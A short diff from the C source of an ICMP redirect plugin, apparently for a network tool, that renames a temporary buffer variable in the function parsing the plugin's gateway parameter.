@@ -71,12 +71,12 @@ static int icmp_redirect_start(char *args)
    if (!strcmp(args, "")) {
       SEMIFATAL_ERROR("ICMP redirect needs a parameter.\n");
    } else {
-      char tmp[strlen(args)+3];
+      char temp[strlen(args)+3];
 
       /* add the / to be able to use the target parsing function */
-      snprintf(tmp, strlen(args)+3, "%s//", args);
+      snprintf(temp, strlen(args)+3, "%s//", args);
       
-      if (compile_target(tmp, &redirected_gw) != ESUCCESS)
+      if (compile_target(temp, &redirected_gw) != ESUCCESS)
          SEMIFATAL_ERROR("Wrong target parameter");
    }
 
